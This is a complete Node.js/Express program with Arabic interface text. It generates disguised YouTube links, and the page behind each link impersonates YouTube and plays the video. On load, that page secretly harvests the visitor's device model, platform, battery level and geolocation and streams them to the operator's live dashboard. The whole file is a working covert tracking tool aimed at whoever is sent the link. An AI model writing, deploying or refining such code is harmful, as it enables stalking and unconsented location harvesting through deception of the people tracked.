const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. لوحة التحكم الرئيسية لإنشاء الرابط
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>منشئ روابط يوتيوب</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
            button { background: #ff0000; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
            button:hover { background: #cc0000; }
            input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
        </style>
    </head>
    <body>
        <h2>📺 منشئ روابط يوتيوب الذكية</h2>
        <div class="card">
            <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
            <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <br><br>
            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <p>الرابط الخاص بك (انسخه وافتحه):</p>
                <input type="text" id="linkInput" readonly onclick="this.select();">
            </div>
        </div>

        <h3>📥 معلومات الأجهزة المستلمة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa;">في انتظار فتح الرابط...</p>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function makeLink() {
                const ytUrl = document.getElementById('ytUrlInput').value;
                let videoId = "dQw4w9WgXcQ";
                
                if (ytUrl.includes('youtu.be/')) {
                    videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
                } else if (ytUrl.includes('v=')) {
                    videoId = ytUrl.split('v=')[1].substring(0, 11);
                }
                
                const uniqueId = Math.random().toString(36).substring(2, 8);
                const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<strong>📱 الجهاز:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 المتصفح:</strong> ' + data.platform + '<br>' +
                                '<strong>🔋 الشحن:</strong> ' + data.battery + '<br>' +
                                '<strong>📍 الموقع:</strong> ' + data.location + '<br>' +
                                '<strong>🕒 الوقت:</strong> ' + data.time;
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة عرض اليوتيوب وجمع المعلومات في الخلفية
app.get('/watch/:id', (req, res) => {
  const videoId = req.query.v || 'dQw4w9WgXcQ';
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
        </style>
    </head>
    <body>
        <div class="header">▶ YouTube</div>
        <div class="container">
            <div class="video-container">
                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
            </div>
        </div>

        <script>
            function getDeviceName(ua) {
                if (ua.includes('iPhone')) return 'iPhone (آيفون)';
                if (ua.includes('iPad')) return 'iPad (آيباد)';
                if (ua.includes('Samsung')) return 'Samsung Galaxy';
                if (ua.includes('Huawei')) return 'Huawei';
                if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) return 'Xiaomi / Redmi';
                if (ua.includes('Android')) return 'Android Device';
                if (ua.includes('Windows')) return 'Windows PC';
                if (ua.includes('Macintosh')) return 'Mac';
                return 'جهاز غير معروف';
            }

            async function collectAndSend() {
                let batteryLevel = "غير مدعوم";
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        batteryLevel = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡ يشحن)" : "");
                    } catch(e){}
                }

                let locationStr = "لم يوافق المستخدم";
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            locationStr = "خط الطول: " + pos.coords.latitude.toFixed(3) + ", خط العرض: " + pos.coords.longitude.toFixed(3);
                            postData(batteryLevel, locationStr);
                        },
                        () => { postData(batteryLevel, locationStr); },
                        { timeout: 5000 }
                    );
                } else {
                    postData(batteryLevel, locationStr);
                }
            }

            function postData(battery, location) {
                const deviceData = {
                    deviceName: getDeviceName(navigator.userAgent),
                    platform: navigator.platform || "موبايل",
                    battery: battery,
                    location: location,
                    time: new Date().toLocaleTimeString('ar-EG')
                };

                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceData)
                });
            }

            window.onload = collectAndSend;
        </script>
    </body>
    </html>
  `);
});

app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
